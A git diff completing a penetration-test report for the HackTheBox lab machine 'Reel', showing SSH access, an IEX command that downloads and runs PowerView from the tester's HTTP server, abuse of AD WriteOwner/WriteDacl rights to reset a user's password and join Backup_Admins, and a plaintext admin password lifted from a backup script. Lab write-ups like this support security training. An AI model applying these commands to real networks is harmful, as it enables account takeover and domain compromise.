@@ -295,9 +295,13 @@ _Initial Shell -_ Microsoft Office/WordPad Remote Code Execution Vulnerability (
 
 **Vulnerability Explanation:**
 
-**Vulnerability Fix:**
+Microsoft Office 2007 SP3, Microsoft Office 2010 SP2, Microsoft Office 2013 SP1, Microsoft Office 2016, Microsoft Windows Vista SP2, Windows Server 2008 SP2, Windows 7 SP1, Windows 8.1 allow remote attackers to execute arbitrary code via a crafted document, aka "Microsoft Office/WordPad Remote Code Execution Vulnerability w/Windows API."
 
-**Severity:**
+**Vulnerability Fix:**&#x20;
+
+Update to the latest software release
+
+**Severity:** **Critical**
 
 **Proof of Concept:**
 
@@ -501,7 +505,7 @@ C:\Windows\system32>
 
 **Local.txt Proof Screenshot**
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>user proof</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (3).png" alt=""><figcaption><p>user proof</p></figcaption></figure>
 
 **Local.txt Contents**
 
@@ -630,31 +634,278 @@ SecurePassword : System.Security.SecureString
 Domain         : HTB
 ```
 
+With SSH open I gain access using tom's credentials
+
+```
+┌──[Thu Nov 10 09:30:59 AM CST 2022]-[TheScriptKid]-[/opt/winreconpack]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.47.91]
+└──# ssh tom@$ip                                                                                                                                            1 ⨯
+tom@10.129.47.91's password: 
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+tom@REEL C:\Users\tom>powershell                                                                                                
+Windows PowerShell                                                                                                              
+Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+
+PS C:\Users\tom>
+```
+
+Before enumerating the active directory domain I will load PowerView, a powershell tool, in memory.
+
+```
+┌──[Tue Nov  8 10:47:39 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# python3 -m http.server 80 -d /opt/winreconpack
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
+
+{% code overflow="wrap" %}
+```
+PS C:\Users\tom> IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.2/powerview.ps1")
+```
+{% endcode %}
+
+```
+┌──[Tue Nov  8 10:47:39 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# python3 -m http.server 80 -d /opt/winreconpack
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.15.19 - - [08/Nov/2022 22:49:14] "GET /powerview.ps1 HTTP/1.1" 200 -
+
+```
+
+I begin checking for non-default groups with one being of interest is the backup\_admins group
+
+```
+PS C:\Users\tom> get-netgroup                                                                                                   
+...                                                                                                       
+Backup_Admins
+AppLocket_Test                                                                                                                 
+SharePoint_Admins                                                                                                               
+DR_Site                                                                                                                         
+SQL_Admins                                                                                                                      
+HelpDesk_Admins                                                                                                                 
+Restrictions                                                                                                                    
+All_Staff                                                                                                                       
+MegaBank_Users                                                                                                                  
+Finance_Users                                                                                                                   
+HR_Team                                                                                                                  
+```
+
+I look into what users/group and the permissions associated and I see that claire has an interesting permission of WriteDacl
+
+```
+PS C:\Users\tom> get-objectacl -SamAccountName "Backup_Admins" -ResolveGUIDs
+
+
+InheritedObjectType   : All                                                                                                     
+ObjectDN              : CN=Backup_Admins,OU=Groups,DC=HTB,DC=LOCAL                                                              
+ObjectType            : All                                                                                                     
+IdentityReference     : HTB\claire                                                                                              
+IsInherited           : False                                                                                                   
+ActiveDirectoryRights : ReadProperty, WriteProperty, GenericExecute, WriteDacl                                                  
+PropagationFlags      : None                                                                                                    
+ObjectFlags           : None                                                                                                    
+InheritanceFlags      : ContainerInherit                                                                                        
+InheritanceType       : All                                                                                                     
+AccessControlType     : Allow                                                                                                   
+ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1135
+```
+
+I proceed into searching for tom's user who may have object access to claire's user. According to the output tom has WriteOwner permissions to claire.
+
+```
+PS C:\Users\tom> Get-ObjectAcl -SamAccountName "claire" -ResolveGUIDs
+
+
+InheritedObjectType   : All                                                                                                     
+ObjectDN              : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL                                                                
+ObjectType            : All                                                                                                     
+IdentityReference     : HTB\tom                                                                                                 
+IsInherited           : False                                                                                                   
+ActiveDirectoryRights : WriteOwner                                                                                              
+PropagationFlags      : None                                                                                                    
+ObjectFlags           : None                                                                                                    
+InheritanceFlags      : None                                                                                                    
+InheritanceType       : None                                                                                                    
+AccessControlType     : Allow                                                                                                   
+ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1130
+```
+
+With this information I can abuse the WriteOwner and WriteDacl permissions as follows
+
+```
+PS C:\Users\tom> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights all                                  
+PS C:\Users\tom> $UserPassword = ConvertTo-SecureString '@Password!23' -AsPlainText -Force                                      
+PS C:\Users\tom> Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword                                         
+PS C:\Users\tom> $Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $UserPassword)                      
+PS C:\Users\tom> Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $Cred
+```
+
+Now I can see claire under the Backup\_Admins group
+
+```
+PS C:\Users\tom> net user claire /domain                                                                                        
+User name                    claire                                                                                             
+Full Name                    Claire Danes                                                                                       
+Comment                                                                                                                         
+User's comment                                                                                                                  
+Country/region code          000 (System Default)                                                                               
+Account active               Yes                                                                                                
+Account expires              Never                                                                                              
+
+Password last set            11/10/2022 5:13:11 PM                                                                              
+Password expires             Never                                                                                              
+Password changeable          11/11/2022 5:13:11 PM                                                                              
+Password required            Yes                                                                                                
+User may change password     Yes                                                                                                
+
+Workstations allowed         All                                                                                                
+Logon script                                                                                                                    
+User profile                                                                                                                    
+Home directory                                                                                                                  
+Last logon                   11/10/2022 5:13:24 PM                                                                              
+
+Logon hours allowed          All                                                                                                
+
+Local Group Memberships      *Hyper-V Administrator                                                                             
+Global Group memberships     *Backup_Admins        *Domain Users                                                                
+                             *MegaBank_Users       *DR_Site                                                                     
+                             *Restrictions                                                                                      
+The command completed successfully.
+```
+
+With claire's password changed I now gain access as claire using SSH
+
+```
+┌──[Thu Nov 10 11:14:40 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# ssh claire@10.129.47.91                                                                                                                              130 ⨯
+claire@10.129.47.91's password: 
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire>
+```
+
+With claire's permissions I am able to view the administrator's directory. Furthermore, I encounter a Backup Scripts directory that includes interesting files, powershell scripts.
+
+```
+claire@REEL C:\Users\Administrator\Desktop>cd "Backup Scripts"                                                                  
+
+claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CC8A-33E1                                                                                              
+
+ Directory of C:\Users\Administrator\Desktop\Backup Scripts                                                                     
+
+11/02/2017  09:47 PM    <DIR>          .                                                                                        
+11/02/2017  09:47 PM    <DIR>          ..                                                                                       
+11/03/2017  11:22 PM               845 backup.ps1                                                                               
+11/02/2017  09:37 PM               462 backup1.ps1                                                                              
+11/03/2017  11:21 PM             5,642 BackupScript.ps1                                                                         
+11/02/2017  09:43 PM             2,791 BackupScript.zip                                                                         
+11/03/2017  11:22 PM             1,855 folders-system-state.txt                                                                 
+11/03/2017  11:22 PM               308 test2.ps1.txt                                                                            
+               6 File(s)         11,903 bytes                                                                                   
+               2 Dir(s)  15,594,967,040 bytes free
+```
+
+My initial thought is to search for passwords in these scripts and what looks to be the administrator is revealed
+
+```
+claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>findstr /si password *.ps1                                            
+BackupScript.ps1:# admin password                                                                                               
+BackupScript.ps1:$password="Cr4ckMeIfYouC4n!"
+```
+
+I attempt to SSH into the administrator user with these credentials and gain administrator access
+
+```
+┌──[Thu Nov 10 01:50:51 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# ssh administrator@10.129.47.91
+administrator@10.129.47.91's password: 
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@REEL C:\Users\Administrator>
+```
 
 
 
+**Vulnerability Exploited: Insecure Access Control Lists**
 
+**Vulnerability Explanation:** W**eak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.**
 
-
-
-
-
-
-**Vulnerability Exploited:**
-
-**Vulnerability Explanation:**
-
-**Vulnerability Fix:**
+**Vulnerability Fix: Remove Unesescary Permissions To Prevent Compromise**
 
 **Severity: Critical**
 
-**Exploit Code:**
-
 **Proof Screenshot Here:**
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p><strong>Root.txt</strong></p></figcaption></figure>
 
 **Proof.txt Contents:**
 
-**Post Exploitation**
+```
+administrator@REEL C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all                          
+REEL                                                                                                                            
+htb\administrator                                                                                                               
+1018a0331e686176ff4577c728eaf32a                                                                                                
+Windows IP Configuration                                                                                                        
+
+   Host Name . . . . . . . . . . . . : REEL                                                                                     
+   Primary Dns Suffix  . . . . . . . : HTB.LOCAL                                                                                
+   Node Type . . . . . . . . . . . . : Hybrid                                                                                   
+   IP Routing Enabled. . . . . . . . : No                                                                                       
+   WINS Proxy Enabled. . . . . . . . : No                                                                                       
+   DNS Suffix Search List. . . . . . : HTB.LOCAL                                                                                
+                                       htb                                                                                      
+
+Ethernet adapter Ethernet0 2:                                                                                                   
+
+   Connection-specific DNS Suffix  . : .htb                                                                                     
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter                                                                 
+   Physical Address. . . . . . . . . : 00-50-56-B9-C6-68                                                                        
+   DHCP Enabled. . . . . . . . . . . : Yes                                                                                      
+   Autoconfiguration Enabled . . . . : Yes                                                                                      
+   IPv6 Address. . . . . . . . . . . : dead:beef::56(Preferred)                                                                 
+   Lease Obtained. . . . . . . . . . : 10 November 2022 06:18:13                                                                
+   Lease Expires . . . . . . . . . . : 10 November 2022 22:45:49                                                                
+   IPv6 Address. . . . . . . . . . . : dead:beef::66:2c96:a520:b43b(Preferred)                                                  
+   Link-local IPv6 Address . . . . . : fe80::66:2c96:a520:b43b%14(Preferred)                                                    
+   IPv4 Address. . . . . . . . . . . : 10.129.47.91(Preferred)                                                                  
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                                              
+   Lease Obtained. . . . . . . . . . : 10 November 2022 06:18:24                                                                
+   Lease Expires . . . . . . . . . . : 10 November 2022 22:48:24                                                                
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%14                                                              
+                                       10.129.0.1                                                                               
+   DHCP Server . . . . . . . . . . . : 10.129.0.1                                                                               
+   DHCPv6 IAID . . . . . . . . . . . : 335564886                                                                                
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-AD-9E-CA-00-50-56-B9-50-75                                                
+   DNS Servers . . . . . . . . . . . : 1.1.1.1                                                                                  
+                                       8.8.8.8                                                                                  
+   NetBIOS over Tcpip. . . . . . . . : Enabled                                                                                  
+   Connection-specific DNS Suffix Search List :                                                                                 
+                                       htb                                                                                      
+
+Tunnel adapter isatap..htb:                                                                                                     
+
+   Media State . . . . . . . . . . . : Media disconnected                                                                       
+   Connection-specific DNS Suffix  . : .htb                                                                                     
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2                                                              
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0                                                                  
+   DHCP Enabled. . . . . . . . . . . : No                                                                                       
+   Autoconfiguration Enabled . . . . : Yes                                                                                      
+
+administrator@REEL C:\Users\Administrator\Desktop>
+```
 
 ### Maintaining Access
 
@@ -668,14 +919,12 @@ After collecting data from the network was completed, I removed all user account
 
 ## Additional Items
 
-### Appendix - Proof and Local Contents:
+### Appendix - Proof and Local Contents
 
-| IP (Hostname) | Local.txt Contents | Proof.txt Contents |
-| ------------- | ------------------ | ------------------ |
-| x.x.x.x       | hash\_here         | hash\_here         |
+| IP (Hostname) | Local.txt Contents               | Proof.txt Contents               |
+| ------------- | -------------------------------- | -------------------------------- |
+| 10.129.47.91  | b38b9329fcdc4ea8887eb109c05c8afd | b2e35251f711471d971e9a660604353d |
 
-### Appendix - Metasploit/Meterpreter Usage
+### Appendix - Bagde
 
-For the pentest, I used my Metasploit/Meterpreter allowance on the following machine: `No Metasploit/Meterpreter was used during engagment`
-
-### Appendix - Completed Buffer Overflow Code
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
